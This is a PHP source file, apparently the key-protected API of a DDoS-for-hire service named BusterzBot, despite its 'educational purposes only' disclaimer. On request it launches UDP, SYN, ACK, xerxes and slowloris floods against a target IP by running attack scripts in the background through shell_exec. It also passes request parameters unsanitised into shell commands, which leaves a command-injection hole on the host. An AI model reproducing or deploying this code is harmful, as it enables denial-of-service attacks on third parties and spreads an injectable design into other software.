<?php
/*
 * Scripted completely from scratch
 * Remember, this has been made for educational purposes only, I am, in no way, responsible for any damages done with this, or with edited versions.
 */

//api for BusterzBot
$keys = array('%keyone', '%keytwo', '%keythree'); //you can change/add keys
$methods = array('rawudp', 'tcp-syn', 'tcp-ack', 'xerxes', 'slowloris', 'http'); //get yourself some more methods
$blacklist = array('8.8.8.8', '1.1.1.1'); //do-not-flood blacklist
$script_path = '/var/www/html/api/scripts'; //full path to scripts
$mt = 300; //max flooding time

if(isset($_GET['key'])&&isset($_GET['t'])&&isset($_GET['m'])&&isset($_GET['ts'])){
	if(!in_array($_GET['key'], $keys)){
		die('fail; key');
	}
	if(!filter_var($_GET['t'])){
		die('fail; ip');
	}
	if(isset($_GET['p'])){
		if($_GET['p'] > 65535 || $_GET['p'] < 1){
			die('fail; port');
		}
	}
	if($_GET['ts'] > $mt || $_GET['ts'] < 1){
		die('fail; time');
	}
	if(!in_array($_GET['m'], $methods)){
		die('fail; method');
	}
	if(in_array($_GET['t'], $blacklist)){
		die('blacklist');
	}
	
	switch($_GET['m']){
		case 'rawudp':
			shell_exec('nohup perl '.$script_path.'/udp '.$_GET['t'].' '.$_GET['p'].' 1024 '.$_GET['ts'].' > /dev/null 2>&1 &');
			$out = 'success';
			break;
		case 'tcp-syn':
			shell_exec('nohup '.$script_path.'/syn '.$_GET['t'].' '.$_GET['p'].' 5 -1 '.$_GET['ts'].' > /dev/null 2>&1 &');
			$out = 'success';
			break;
		case 'tcp-ack':
			shell_exec('nohup '.$script_path.'/ack '.$_GET['t'].' '.$_GET['p'].' 5 -1 '.$_GET['ts'].' > /dev/null 2>&1 &');
			$out = 'success';
			break;
		case 'xerxes':
			shell_exec('nohup timeout '.$_GET['ts'].' '.$script_path.'/xerxes '.$_GET['t'].' '.$_GET['p'].' > /dev/null 2>&1 &');
			$out = 'success';
			break;
		case 'slowloris':
			shell_exec('nohup timeout '.$_GET['ts'].' perl '.$script_path.'/slowloris -dns '.$_GET['t'].' -port '.$_GET['p'].' > /dev/null 2>&1 &');
			$out = 'success';
			break;
		default:
			$out = 'fail; unknown';
	}
	die($out);
}